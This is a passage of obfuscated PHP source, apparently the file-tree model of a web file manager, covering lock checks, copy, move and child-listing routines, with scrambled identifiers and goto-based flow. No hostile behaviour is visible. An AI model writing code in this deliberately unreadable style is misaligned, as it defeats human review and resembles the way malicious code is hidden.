$bˆ†Ç‰‘ÜÁ); goto B¦ÁÅìÎ…·; cõÅŒ¶ëßÊ: $B¬è‡Ïô­Ø =& $_SERVER[±á õÁ]; if (!$this->allowLock()) { return; } $bˆ†Ç‰‘ÜÁ = 0; goto FÂ†éêóœ§; bùÍªï»›´: } private function _lockCheck($B‰ÏƒÍ™†, $Cñ®’ëÈ¾’) { goto ağšƒÛğ«º; Aóİ‘»˜Æ–: $this->_lockTimeStart[$B—“Í•¼²] = timeFloat(); if (!is_array($Cù‡¤Ñ—)) { return; } $DÄÀÀËàš = LNG($Dø©ŞÌ‡ö¾[523]); goto bƒÓ ÷öçÓ; ağšƒÛğ«º: $Dø©ŞÌ‡ö¾ =& $_SERVER[±á õÁ]; $Cù‡¤Ñ— = $this->sourceInfo($Cñ®’ëÈ¾’); $B—“Í•¼² = $B‰ÏƒÍ™† . $Dø©ŞÌ‡ö¾[101] . $Cñ®’ëÈ¾’; goto Aóİ‘»˜Æ–; bƒÓ ÷öçÓ: CacheLock::setErrorMsg($Dø©ŞÌ‡ö¾[167] . htmlspecialchars($Cù‡¤Ñ—[$Dø©ŞÌ‡ö¾[38]]) . $Dø©ŞÌ‡ö¾[501] . $DÄÀÀËàš); $this->_lockKey($B—“Í•¼², 1); $this->_lockKey($B—“Í•¼², 0); goto a®ÎæÖ‘÷; a®ÎæÖ‘÷: $FÎŠì´¹Î = array_reverse($this->parentLevelArray($Cù‡¤Ñ—[$Dø©ŞÌ‡ö¾[484]])); foreach ($FÎŠì´¹Î as $Bø·°‰Î) { $B—“Í•¼² = $B‰ÏƒÍ™† . $Dø©ŞÌ‡ö¾[524] . $Bø·°‰Î; if (CacheLock::lockGet($Dø©ŞÌ‡ö¾[525] . $B—“Í•¼²)) { $Cù‡¤Ñ— = $this->sourceInfo($Bø·°‰Î); CacheLock::setErrorMsg($Dø©ŞÌ‡ö¾[167] . htmlspecialchars($Cù‡¤Ñ—[$Dø©ŞÌ‡ö¾[38]]) . $Dø©ŞÌ‡ö¾[501] . $DÄÀÀËàš); $this->_lockKey($B—“Í•¼², 1); $this->_lockKey($B—“Í•¼², 0); } } goto F¶¦”ÚÌñ; F¶¦”ÚÌñ: } private function _lockCheckEnd($bšƒ²È„ì, $cËÇëµØö) { goto f•ã¨æŒ; C…¢œè±¥Ñ: if ($BéƒªâÙì… > 0.5) { unset(self::$cacheSourceInfo[$EÔ°×…éµ[434] . $cËÇëµØö]); } $eÔâöºå‚ = $this->sourceInfo($cËÇëµØö); if (!$eÔâöºå‚) { show_json(LNG($EÔ°×…éµ[111]), !1); } goto eĞ­Èò´Éî; f•ã¨æŒ: $EÔ°×…éµ =& $_SERVER[±á õÁ]; $d¬´–Á­ÕÒ = $bšƒ²È„ì . $EÔ°×…éµ[101] . $cËÇëµØö; CacheLock::setErrorMsg($EÔ°×…éµ[18]); goto DÖ£Œ åÇ¯; DÖ£Œ åÇ¯: if (!isset($this->_lockTimeStart[$d¬´–Á­ÕÒ])) { return; } $BéƒªâÙì… = timeFloat() - $this->_lockTimeStart[$d¬´–Á­ÕÒ]; unset($this->_lockTimeStart[$d¬´–Á­ÕÒ]); goto C…¢œè±¥Ñ; eĞ­Èò´Éî: } private function _lockParent($BáŠÎ—Ø—Ä, $aèæÂ¥¤Ì, $A·Ìƒ¡Õè´) { if (!$this->autoLockSet) { return; } $E¹Ìï¢ø¾ = $this->sourceInfo($BáŠÎ—Ø—Ä); if (!is_array($E¹Ìï¢ø¾)) { return; } $b½«‹Ì’®« = array_reverse($this->parentLevelArray($E¹Ìï¢ø¾[$_SERVER[±á õÁ][484]])); foreach ($b½«‹Ì’®« as $Cê–¦±ï”) { $this->_lockEvent($Cê–¦±ï”, $aèæÂ¥¤Ì, $A·Ìƒ¡Õè´); } } private function _lockEvent($Dª’²ŒŞ˜, $aáéŠÁ˜¾°, $F·ÊÖËÏĞ) { $eÃÛ¬ë‡÷ğ =& $_SERVER[±á õÁ]; if (!$this->autoLockSet) { return; } foreach ($aáéŠÁ˜¾° as $c›åõÕƒÅ) { $EÏ¾Ò™†¥ = $c›åõÕƒÅ . $eÃÛ¬ë‡÷ğ[101] . $Dª’²ŒŞ˜; if ($F·ÊÖËÏĞ && CacheLock::lockGet($eÃÛ¬ë‡÷ğ[525] . $EÏ¾Ò™†¥)) { continue; } $this->_lockKey($EÏ¾Ò™†¥, $F·ÊÖËÏĞ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Bé­Ç‹Æ†À, $C˜Ò’´±ùÕ = 1) { $DÊš„¾÷ìÉ = $_SERVER[±á õÁ][525] . md5($Bé­Ç‹Æ†À); if ($C˜Ò’´±ùÕ) { if (isset(self::$_lockItemArr[$DÊš„¾÷ìÉ])) { return; } self::$_lockItemArr[$DÊš„¾÷ìÉ] = 1; CacheLock::lock($DÊš„¾÷ìÉ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$DÊš„¾÷ìÉ])) { return; } unset(self::$_lockItemArr[$DÊš„¾÷ìÉ]); CacheLock::unlock($DÊš„¾÷ìÉ); } } public function isParentOf($cø‰Â »¶ö, $Dß„Îêïë) { goto cŒİøÑÌœ÷; AŞ¬Ú¶ö•Ú: return $CìˆÌ° ½»; goto dÓ±â“Ã¼; cŒİøÑÌœ÷: $b¥ÑŒÂ¯œÉ =& $_SERVER[±á õÁ]; $d—ÑÑ“Ëö° = $this->sourceInfo($cø‰Â »¶ö); $dŒÙçÁ™á = $this->sourceInfo($Dß„Îêïë); goto cæÛù†§¬‘; cæÛù†§¬‘: $fÚ…åê¡ = $d—ÑÑ“Ëö°[$b¥ÑŒÂ¯œÉ[484]] . $d—ÑÑ“Ëö°[$b¥ÑŒÂ¯œÉ[393]] . $b¥ÑŒÂ¯œÉ[57]; $e—Ù…Ë»¢ = $dŒÙçÁ™á[$b¥ÑŒÂ¯œÉ[484]] . $dŒÙçÁ™á[$b¥ÑŒÂ¯œÉ[393]] . $b¥ÑŒÂ¯œÉ[57]; $CìˆÌ° ½» = strpos($e—Ù…Ë»¢, $fÚ…åê¡) === 0; goto AŞ¬Ú¶ö•Ú; dÓ±â“Ã¼: } private $targetIsDelete = 0; public function copy($Eƒ¯œÇİàï, $eùó¨…ÓÓ, $bí§°ÄÜ“² = REPEAT_REPLACE, $báİØ˜¶‘ = '') { goto Céˆ¶’¯«£; BøãÇÍˆ¼: if ($DÙ‘°İ…òé[$Cî”Ğ„Ø©ñ[394]] == $Cî”Ğ„Ø©ñ[93] && $A±æÒ¢¾¹¨ == $aÑ³òìçç) { $this->folderSizeResetChildren($A±æÒ¢¾¹¨); } Model($Cî”Ğ„Ø©ñ[529])->addAll($CÏÙ„‹²Ë©[$Cî”Ğ„Ø©ñ[527]], array(), !0); if ($A±æÒ¢¾¹¨ != $aÑ³òìçç || $DÙ‘°İ…òé[$Cî”Ğ„Ø©ñ[394]] == $Cî”Ğ„Ø©ñ[93]) { Model($Cî”Ğ„Ø©ñ[530])->eventCopy($aÑ³òìçç); } goto D×ÍŸ¼—†; dÃÒ®¢ó­: if (!$DÙ‘°İ…òé || !$DÀíïäÕ‡ || $DÀíïäÕ‡[$Cî”Ğ„Ø©ñ[394]] != $Cî”Ğ„Ø©ñ[93]) { return !1; } if ($this->isParentOf($Eƒ¯œÇİàï, $eùó¨…ÓÓ)) { return !1; } $a…Â¼šÏÀ = $báİØ˜¶‘ ? $báİØ˜¶‘ : $DÙ‘°İ…òé[$Cî”Ğ„Ø©ñ[38]]; goto aƒŒ†ù·Äö; D×ÍŸ¼—†: $this->saveAll($CÏÙ„‹²Ë©[$Cî”Ğ„Ø©ñ[528]]); Model($Cî”Ğ„Ø©ñ[181])->linkAdd($CÏÙ„‹²Ë©[$Cî”Ğ„Ø©ñ[526]]); $this->folderSizeReset($eùó¨…ÓÓ); goto BØâõ¹Í; föÖŠŒ…¥Û: $this->_childrenListClear(); $this->lockCopyEnd($Eƒ¯œÇİàï); $this->lockWriteEnd($eùó¨…ÓÓ, $a…Â¼šÏÀ); goto BøãÇÍˆ¼; EÂôœÚ­®ï: $this->targetIsDelete = intval($DÙ‘°İ…òé[$Cî”Ğ„Ø©ñ[421]]); $A±æÒ¢¾¹¨ = $this->fileNameExistCache($eùó¨…ÓÓ, $DÙ‘°İ…òé[$Cî”Ğ„Ø©ñ[38]]); $aÑ³òìçç = $this->_copy($Eƒ¯œÇİàï, $eùó¨…ÓÓ, $bí§°ÄÜ“², $CÏÙ„‹²Ë©, !0, $báİØ˜¶‘); goto föÖŠŒ…¥Û; aƒŒ†ù·Äö: $this->lockCopyStart($Eƒ¯œÇİàï); $this->lockWriteStart($eùó¨…ÓÓ, $a…Â¼šÏÀ); $CÏÙ„‹²Ë© = array($Cî”Ğ„Ø©ñ[526] => array(), $Cî”Ğ„Ø©ñ[527] => array(), $Cî”Ğ„Ø©ñ[528] => array()); goto EÂôœÚ­®ï; Céˆ¶’¯«£: $Cî”Ğ„Ø©ñ =& $_SERVER[±á õÁ]; $DÙ‘°İ…òé = $this->sourceInfo($Eƒ¯œÇİàï); $DÀíïäÕ‡ = $this->sourceInfo($eùó¨…ÓÓ); goto dÃÒ®¢ó­; BØâõ¹Í: $this->updateModifyTime($eùó¨…ÓÓ); return $aÑ³òìçç; goto câç„øŠ‰×; câç„øŠ‰×: } private function _copy($BŸë˜…ñŞ, $b±ÑÙ”‹Ğœ, $D²Ñââ›ò“, &$f“É¤²ïà·, $D‡ç¹ì’·, $DÙÚé”— = '') { goto c¾°¼ì´Æš; c¾°¼ì´Æš: $cáä©¨Ú© =& $_SERVER[±á õÁ]; $bÇ®˜§¶Š‘ = $this->sourceInfoCache($BŸë˜…ñŞ); $b‡ÔãÑÒ²Û = $bÇ®˜§¶Š‘[$cáä©¨Ú©[394]] == $cáä©¨Ú©[93]; goto BºÀïØŒî³; BºÀïØŒî³: $bØä÷ÊÔ¼¸ = $DÙÚé”— ? $DÙÚé”— : $bÇ®˜§¶Š‘[$cáä©¨Ú©[38]]; $E‡¦×óÚù = $this->fileNameExistCache($b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸); if ($D‡ç¹ì’·) { $this->_childrenAllMake($BŸë˜…ñŞ); if ($b‡ÔãÑÒ²Û && $E‡¦×óÚù) { $this->_childrenAllMake($E‡¦×óÚù); } } goto a‹î“ğğÆ; fë·Ñè÷: return $A†ÊÈø¢¡µ; goto fÅå¿É¶ÁÑ; a‹î“ğğÆ: if (!$E‡¦×óÚù) { return $this->_copyCreate($BŸë˜…ñŞ, $b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸, $f“É¤²ïà·); } $A†ÊÈø¢¡µ = $E‡¦×óÚù; if ($b‡ÔãÑÒ²Û) { if ($D²Ñââ›ò“ == REPEAT_RENAME_FOLDER) { $bØä÷ÊÔ¼¸ = $this->fileNameAutoCache($b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸, $D²Ñââ›ò“, $b‡ÔãÑÒ²Û); $A†ÊÈø¢¡µ = $this->_copyCreate($BŸë˜…ñŞ, $b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸, $f“É¤²ïà·); } else { $BäÈ›„º = $this->_childrenList($BŸë˜…ñŞ); foreach ($BäÈ›„º as $bùÇÕßŠŠ) { $this->_copy($bùÇÕßŠŠ[$cáä©¨Ú©[393]], $E‡¦×óÚù, $D²Ñââ›ò“, $f“É¤²ïà·, !1); } } } else { if ($D²Ñââ›ò“ == REPEAT_RENAME || $D²Ñââ›ò“ == REPEAT_RENAME_FOLDER) { $bØä÷ÊÔ¼¸ = $this->fileNameAutoCache($b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸, $D²Ñââ›ò“, $b‡ÔãÑÒ²Û); $A†ÊÈø¢¡µ = $this->_copyCreate($BŸë˜…ñŞ, $b±ÑÙ”‹Ğœ, $bØä÷ÊÔ¼¸, $f“É¤²ïà·); } else { if ($D²Ñââ›ò“ == REPEAT_REPLACE) { $Dù™ô¥ƒÌ = $this->sourceInfoCache($E‡¦×óÚù); $DÕ£æÇ ÅÁ = $this->fileHistory($Dù™ô¥ƒÌ, $bÇ®˜§¶Š‘[$cáä©¨Ú©[443]], $bÇ®˜§¶Š‘[$cáä©¨Ú©[87]]); if ($DÕ£æÇ ÅÁ) { $f“É¤²ïà·[$cáä©¨Ú©[526]][] = $bÇ®˜§¶Š‘[$cáä©¨Ú©[443]]; } } else { if ($D²Ñââ›ò“ == REPEAT_SKIP) { } } } Hook::trigger($cáä©¨Ú©[531], array($cáä©¨Ú©[532], $bÇ®˜§¶Š‘, 0)); } goto fë·Ñè÷; fÅå¿É¶ÁÑ: } private function _copyCreate($EèêÒÒÉ‹, $A½ß÷‰ì¸, $CÎ ö´Ï¶, &$e¶›‚ä¿ø‘) { goto a´®Ëãİ³¿; CŒ¡ÂŞöÔ: foreach ($BŠç«°«™ as $C˜¢À‘ô’Î) { $a˜ÏÓ²Ö” = $C˜¢À‘ô’Î[$aç‡¬àø·™[393]]; $e®«é²¡« = $this->_childrenMatch($fóá©ÜƒÍ´, $C˜¢À‘ô’Î, $eãöºˆ¾¡ä); $d³ÛÊŒõ¾†[] = array($aç‡¬àø·™[393], $a˜ÏÓ²Ö”, $aç‡¬àø·™[486], $e®«é²¡«[$aç‡¬àø·™[486]]); $cº‡«êİææ[] = array($aç‡¬àø·™[393], $a˜ÏÓ²Ö”, $aç‡¬àø·™[484], $e®«é²¡«[$aç‡¬àø·™[484]]); $this->_copyApplyMeta($C˜¢À‘ô’Î, $e¶›‚ä¿ø‘); if ($C˜¢À‘ô’Î[$aç‡¬àø·™[394]] != $aç‡¬àø·™[93]) { $e¶›‚ä¿ø‘[$aç‡¬àø·™[526]][] = $C˜¢À‘ô’Î[$aç‡¬àø·™[443]]; } } $this->chunkEventSet($aç‡¬àø·™[538], array($aç‡¬àø·™[539], $Aïø£¤¡, $eˆØö§®‰)); $this->saveAll($d³ÛÊŒõ¾†); goto bîéâÉ°ø; b·ïƒêöƒ³: $Aïø£¤¡ = $this->_makeItemData($F¡†µ‘ò×Ó, $dœÜ‡±ä‡‘, $CÎ ö´Ï¶); Hook::trigger($aç‡¬àø·™[533], $Aïø£¤¡); Hook::trigger($aç‡¬àø·™[534], array($aç‡¬àø·™[535], $Aïø£¤¡, 0)); goto Aßæ›‹ŒÂ·; dÀøÛƒÏŠ: $this->_childrenListAll($EèêÒÒÉ‹, $eÂ¡ÉÄåô¶); $eˆØö§®‰ = count($eÂ¡ÉÄåô¶); if ($eˆØö§®‰ == 0) { return $FÔª……¿¡; } goto D¦İŞ“É¿ê; D¦İŞ“É¿ê: $eãöºˆ¾¡ä = $this->sourceInfo($FÔª……¿¡); foreach ($eÂ¡ÉÄåô¶ as $C˜¢À‘ô’Î) { $c šÂ¸ÍÙŞ = $this->_makeItemData($C˜¢À‘ô’Î, $eãöºˆ¾¡ä, $C˜¢À‘ô’Î[$aç‡¬àø·™[38]]); $c šÂ¸ÍÙŞ[$aç‡¬àø·™[484]] = $C˜¢À‘ô’Î[$aç‡¬àø·™[484]]; $FÖ°‰¨ˆ»Ù[] = $c šÂ¸ÍÙŞ; } $this->chunkEventSet($aç‡¬àø·™[536], array($aç‡¬àø·™[537], $Aïø£¤¡, $eˆØö§®‰)); goto bºÒ¤ßäˆ; a´®Ëãİ³¿: $aç‡¬àø·™ =& $_SERVER[±á õÁ]; $F¡†µ‘ò×Ó = $this->sourceInfoCache($EèêÒÒÉ‹); $dœÜ‡±ä‡‘ = $this->sourceInfoCache($A½ß÷‰ì¸); goto b·ïƒêöƒ³; bîéâÉ°ø: $this->chunkEventSet($aç‡¬àø·™[540], array($aç‡¬àø·™[541], $Aïø£¤¡, $eˆØö§®‰)); $this->saveAll($cº‡«êİææ); return $FÔª……¿¡; goto F‹õœåïØô; bºÒ¤ßäˆ: $this->addAll($FÖ°‰¨ˆ»Ù, array(), !1); $BŠç«°«™ = $this->where(array($aç‡¬àø·™[486] => $FÔª……¿¡))->select(); $fóá©ÜƒÍ´ = $this->_childrenMakeRelation($eÂ¡ÉÄåô¶, $BŠç«°«™); goto d°æ£ŞŞ¶Â; Aßæ›‹ŒÂ·: $FÔª……¿¡ = $this->add($Aïø£¤¡); $BŞÁŒ²˜îØ = array($aç‡¬àø·™[393] => $FÔª……¿¡, $aç‡¬àø·™[38] => $CÎ ö´Ï¶); $this->_copyApplyMeta($BŞÁŒ²˜îØ, $e¶›‚ä¿ø‘); goto aœ¢¤‚ÖÇ›; d°æ£ŞŞ¶Â: $fóá©ÜƒÍ´[$EèêÒÒÉ‹] = $FÔª……¿¡; $d³ÛÊŒõ¾† = array(); $cº‡«êİææ = array(); goto CŒ¡ÂŞöÔ; aœ¢¤‚ÖÇ›: if ($F¡†µ‘ò×Ó[$aç‡¬àø·™[394]] != $aç‡¬àø·™[93]) { $e¶›‚ä¿ø‘[$aç‡¬àø·™[526]][] = $F¡†µ‘ò×Ó[$aç‡¬àø·™[443]]; return $FÔª……¿¡; } $eÂ¡ÉÄåô¶ = array(); $FÖ°‰¨ˆ»Ù = array(); goto dÀøÛƒÏŠ; F‹õœåïØô: } private function _childrenMakeRelation($DŒ‰×²¦ÌÅ, $cñä˜è‹à) { $fêÃ•³²° =& $_SERVER[±á õÁ]; $d—×äƒ×Ò = array(); $f’¦ğêø»¹ = array(); foreach ($DŒ‰×²¦ÌÅ as $Dù¦óïäâ) { $B÷òù‰ó¨¼ = $Dù¦óïäâ[$fêÃ•³²°[38]] . $fêÃ•³²°[8] . $Dù¦óïäâ[$fêÃ•³²°[484]]; $d—×äƒ×Ò[$B÷òù‰ó¨¼] = $Dù¦óïäâ[$fêÃ•³²°[393]]; } foreach ($cñä˜è‹à as $Dù¦óïäâ) { $B÷òù‰ó¨¼ = $Dù¦óïäâ[$fêÃ•³²°[38]] . $fêÃ•³²°[8] . $Dù¦óïäâ[$fêÃ•³²°[484]]; $eÍÄ¿†† = $d—×äƒ×Ò[$B÷òù‰ó¨¼]; $f’¦ğêø»¹[$eÍÄ¿††] = $Dù¦óïäâ[$fêÃ•³²°[393]]; } return $f’¦ğêø»¹; } private function _childrenMatch($dÒ¬Öìô¤, $c˜ğİÑÏè, $AÏÂ©¾Šòİ) { goto d’¿Ãõ°õ¾; d’¿Ãõ°õ¾: $cç®Í…’÷ˆ =& $_SERVER[±á õÁ]; $DèÍ³¡ÅË„ = $AÏÂ©¾Šòİ[$cç®Í…’÷ˆ[484]]; $f«è÷à²µ– = $this->parentLevelArray($c˜ğİÑÏè[$cç®Í…’÷ˆ[484]]); goto fÅ‡¿ÔåÏÄ; E«ˆÑ§‰³: $eš¤¯Üªª§ = $a¤î¡–‹åŞ[count($a¤î¡–‹åŞ) - 1]; return array($cç®Í…’÷ˆ[486] => $eš¤¯Üªª§, $cç®Í…’÷ˆ[484] => $DèÍ³¡ÅË„); goto cÕ•›½Íİ¤; fÅ‡¿ÔåÏÄ: foreach ($f«è÷à²µ– as $bÎ…“ßÀø») { if (isset($dÒ¬Öìô¤[$bÎ…“ßÀø»])) { $DèÍ³¡ÅË„ .= $dÒ¬Öìô¤[$bÎ…“ßÀø»] . $cç®Í…’÷ˆ[542]; } } $DèÍ³¡ÅË„ = rtrim($DèÍ³¡ÅË„, $cç®Í…’÷ˆ[57]) . $cç®Í…’÷ˆ[57]; $a¤î¡–‹åŞ = $this->parentLevelArray($DèÍ³¡ÅË„); goto E«ˆÑ§‰³; cÕ•›½Íİ¤: } private function _makeItemData($dÉ‘Ë‘†³, $C˜¿ŒÌÙ¾—, $b¤Š¯êôÑ) { $Aë±°²¨– =& $_SERVER[±á õÁ]; $CÎ˜»çŠïß = array($Aë±°²¨–[543] => $dÉ‘Ë‘†³[$Aë±°²¨–[394]], $Aë±°²¨–[410] => $b¤Š¯êôÑ, $Aë±°²¨–[544] => $dÉ‘Ë‘†³[$Aë±°²¨–[396]], $Aë±°²¨–[444] => $dÉ‘Ë‘†³[$Aë±°²¨–[443]], $Aë±°²¨–[545] => $dÉ‘Ë‘†³[$Aë±°²¨–[87]], $Aë±°²¨–[546] => $C˜¿ŒÌÙ¾—[$Aë±°²¨–[395]], $Aë±°²¨–[547] => $C˜¿ŒÌÙ¾—[$Aë±°²¨–[481]], $Aë±°²¨–[548] => USER_ID, $Aë±°²¨–[549] => USER_ID, $Aë±°²¨–[392] => $C˜¿ŒÌÙ¾—[$Aë±°²¨–[393]], $Aë±°²¨–[550] => $C˜¿ŒÌÙ¾—[$Aë±°²¨–[484]] . $C˜¿ŒÌÙ¾—[$Aë±°²¨–[393]] . $Aë±°²¨–[57], $Aë±°²¨–[420] => 0, $Aë±°²¨–[551] => $Aë±°²¨–[43]); return $CÎ˜»çŠïß; } private function _copyApplyMeta($cÅÓ““É , &$AªÎ¦îöØ’) { $b”»ãïÖ‰ =& $_SERVER[±á õÁ]; $e§øìˆŒ¿Ï = $cÅÓ““É [$b”»ãïÖ‰[393]]; $A‹ñòÕ‰ã = $cÅÓ““É [$b”»ãïÖ‰[38]]; if (!isset($cÅÓ““É [$b”»ãïÖ‰[552]]) || !$cÅÓ““É [$b”»ãïÖ‰[552]] || $cÅÓ““É [$b”»ãïÖ‰[552]] == $b”»ãïÖ‰[493]) { $AªÎ¦îöØ’[$b”»ãïÖ‰[528]][] = array($b”»ãïÖ‰[393], $e§øìˆŒ¿Ï, $b”»ãïÖ‰[552], short_id($e§øìˆŒ¿Ï)); } if (Input::check($A‹ñòÕ‰ã, $b”»ãïÖ‰[553])) { $AªÎ¦îöØ’[$b”»ãïÖ‰[527]][] = array($b”»ãïÖ‰[393] => $e§øìˆŒ¿Ï, $b”»ãïÖ‰[99] => $b”»ãïÖ‰[440], $b”»ãïÖ‰[375] => str_replace($b”»ãïÖ‰[60], $b”»ãïÖ‰[43], Pinyin::encode($A‹ñòÕ‰ã))); $AªÎ¦îöØ’[$b”»ãïÖ‰[527]][] = array($b”»ãïÖ‰[393] => $e§øìˆŒ¿Ï, $b”»ãïÖ‰[99] => $b”»ãïÖ‰[439], $b”»ãïÖ‰[375] => Pinyin::encode($A‹ñòÕ‰ã, $b”»ãïÖ‰[554])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($fÄÇë–ÇÙ) { goto cä©‡ÛÚÀ; cä©‡ÛÚÀ: $D×‹Ÿ‘«™¥ =& $_SERVER[±á õÁ]; $c„½°’ìİÔ = $this->sourceInfo($fÄÇë–ÇÙ); $dåè’Ÿ“¢Ò = $D×‹Ÿ‘«™¥[422]; goto aŠßÆÛÆ‚; d¸«Ë„Ğ: $eÏ¢Å¸›Ø› = array_to_keyvalue($eÏ¢Å¸›Ø›, $D×‹Ÿ‘«™¥[393]); foreach ($eÏ¢Å¸›Ø› as $A‰šãµ‹ãˆ) { $Cñ³ùó‡‰Ø = $A‰šãµ‹ãˆ[$D×‹Ÿ‘«™¥[486]]; $fÄÇë–ÇÙ = $A‰šãµ‹ãˆ[$D×‹Ÿ‘«™¥[393]]; if (!isset($this->_childrenListCache[$fÄÇë–ÇÙ]) && $A‰šãµ‹ãˆ[$D×‹Ÿ‘«™¥[394]] == $D×‹Ÿ‘«™¥[93]) { $this->_childrenListCache[$fÄÇë–ÇÙ] = array(); } if (!isset($this->_childrenListCache[$Cñ³ùó‡‰Ø])) { $this->_childrenListCache[$Cñ³ùó‡‰Ø] = array(); } $this->_childrenListCache[$Cñ³ùó‡‰Ø][$fÄÇë–ÇÙ] = $A‰šãµ‹ãˆ; $this->_childrenItemCache[$fÄÇë–ÇÙ] = $A‰šãµ‹ãˆ; } goto CÜ¤İì…î×; aŠßÆÛÆ‚: $aó”éË‹Ê£ = array($D×‹Ÿ‘«™¥[484] => array($D×‹Ÿ‘«™¥[508], $c„½°’ìİÔ[$D×‹Ÿ‘«™¥[484]] . $fÄÇë–ÇÙ . $D×‹Ÿ‘«™¥[509]), $D×‹Ÿ‘«™¥[421] => $this->targetIsDelete); $eÏ¢Å¸›Ø› = $this->field($dåè’Ÿ“¢Ò)->where($aó”éË‹Ê£)->select(); if (!$eÏ¢Å¸›Ø›) { return; } goto d¸«Ë„Ğ; CÜ¤İì…î×: } private function _childrenListAll($E÷¥ß¶Ôí‹, &$F”¥‚ÉÃç) { $bÎ¸¶÷ÆéÒ =& $_SERVER[±á õÁ]; if (!isset($this->_childrenListCache[$E÷¥ß¶Ôí‹])) { return; } $bá¸¥ÆÉ = $this->_childrenListCache[$E÷¥ß¶Ôí‹]; foreach ($bá¸¥ÆÉ as $BõÃÎ†Î÷ô => $EÊÌ–‘æØ¤) { $F”¥‚ÉÃç[$BõÃÎ†Î÷ô] = $EÊÌ–‘æØ¤; if ($EÊÌ–‘æØ¤[$bÎ¸¶÷ÆéÒ[394]] == $bÎ¸¶÷ÆéÒ[93]) { $this->_childrenListAll($BõÃÎ†Î÷ô, $F”¥‚ÉÃç); } } } private function sourceInfoCache($FéÕˆ˜·Ü) { if (isset($this->_childrenItemCache[$FéÕˆ˜·Ü])) { return $this->_childrenItemCache[$FéÕˆ˜·Ü]; } return $this->sourceInfo($FéÕˆ˜·Ü); } private function _childrenList($cáÑÜïóøó) { if (isset($this->_childrenListCache[$cáÑÜïóøó])) { return $this->_childrenListCache[$cáÑÜïóøó]; } return $this->_childrenListSelect($cáÑÜïóøó); } private function _childrenListSelect($d•µ‹¨Ÿö) { goto Bœ™õÎÖØ; dÈæ‚«¶Ê: foreach ($Fä»ğ‚ŞŸ´ as $d•µ‹¨Ÿö => $c›ó–Ğ®¦) { $this->_childrenItemCache[$d•µ‹¨Ÿö] = $c›ó–Ğ®¦; } return $Fä»ğ‚ŞŸ´; goto FŒÍİ ø–; Bœ™õÎÖØ: $BÄã”ÆØ‘ =& $_SERVER[±á õÁ]; $dŸÛ“¨Ï£ = array($BÄã”ÆØ‘[486] => $d•µ‹¨Ÿö, $BÄã”ÆØ‘[421] => $this->targetIsDelete); $A«‹—á… = $this->where($dŸÛ“¨Ï£)->select(); goto B’İ·ö„‘ø; B’İ·ö„‘ø: $A«‹—á… = $A«‹—á… ? $A«‹—á… : array(); $Fä»ğ‚ŞŸ´ = array_to_keyvalue($A«‹—á…, $BÄã”ÆØ‘[393]); $this->_childrenListCache[$d•µ‹¨Ÿö] = $Fä»ğ‚ŞŸ´; goto dÈæ‚«¶Ê; FŒÍİ ø–: } private function fileNameExistCache($Cœ¤†ÆåÉê, $a‰×Ş¤Â×˜) { $BŒáßíÛ­œ =& $_SERVER[±á õÁ]; $a‰×Ş¤Â×˜ = strtolower($a‰×Ş¤Â×˜); $E–×†õ‰ª = $this->_childrenList($Cœ¤†ÆåÉê); foreach ($E–×†õ‰ª as $Fê«•‘¡¡«) { if ($a‰×Ş¤Â×˜ == strtolower($Fê«•‘¡¡«[$BŒáßíÛ­œ[38]])) { return $Fê«•‘¡¡«[$BŒáßíÛ­œ[393]]; } } return !1; } private function fileNameAutoCache($bñŠ•‚ê¾, $a†–¾™Õ˜¬, $dİáŠˆİ…”, $D“Ì‰àª¼) { $fÇéŠ±µ­ö =& $_SERVER[±á õÁ]; $F—¼µ‹¸Æß = $this->_childrenList($bñŠ•‚ê¾); $D°‰‚‹»›¬ = array_to_keyvalue($F—¼µ‹¸Æß, $fÇéŠ±µ­ö[43], $fÇéŠ±µ­ö[38]); return $this->fileNameAutoGet($D°‰‚‹»›¬, $a†–¾™Õ˜¬, $dİáŠˆİ…”, $D“Ì‰àª¼); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Bˆä…—˜ª, $aÕˆÆÚÚÏß, $b„Ô²¯”˜Ü = REPEAT_REPLACE, $aâÑ›ÇëµÉ = '') { goto AñîÒÓµßì; DŒ²…Ÿ©ÌÈ: $a‰ê¾µˆ« = $this->fileNameExistCache($aÕˆÆÚÚÏß, $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[38]]); $aÇÎš¼½‡ = $this->_move($Bˆä…—˜ª, $aÕˆÆÚÚÏß, $b„Ô²¯”˜Ü, $C†›†…—‡¨, $aâÑ›ÇëµÉ); $this->sourceCacheClear(); goto E£¿‚ÉãŒ; fÀÂÏ‘¢¦: return $aÇÎš¼½‡; goto c‰˜÷­; AÊ©Óß˜’: $this->lockMoveEnd($Bˆä…—˜ª); $this->lockWriteEnd($aÕˆÆÚÚÏß, $fÕñø­Ä­); $this->folderSizeReset($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[486]]); goto C´Ø‘Ğâ–; dˆª˜Ğ©óé: if ($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[486]] == $aÕˆÆÚÚÏß && $aâÑ›ÇëµÉ != $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[38]]) { $f’‰ƒöÉŠá = $this->fileNameExist($aÕˆÆÚÚÏß, $aâÑ›ÇëµÉ); if ($f’‰ƒöÉŠá && $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[394]] == $fŞ«ó§Á‡[493]) { goto fÙˆŒšñ; bˆ‡‡Àôî´: return $f’‰ƒöÉŠá; goto Dã´“ˆÏƒ; fÙˆŒšñ: $dÕî˜ùÏß = $this->sourceInfo($f’‰ƒöÉŠá); $bŞá¯ªœí¼ = $this->fileHistory($dÕî˜ùÏß, $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[443]], $d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[87]]); if (!$bŞá¯ªœí¼) { Model($fŞ«ó§Á‡[446])->remove($d¸ÎÇ™Ú¼¾[$fŞ«ó§Á‡[443]]); } goto eŞç®¶ßšÕ; eŞç®¶ßšÕ: $this->removeNow($Bˆä…—˜ª, !1); 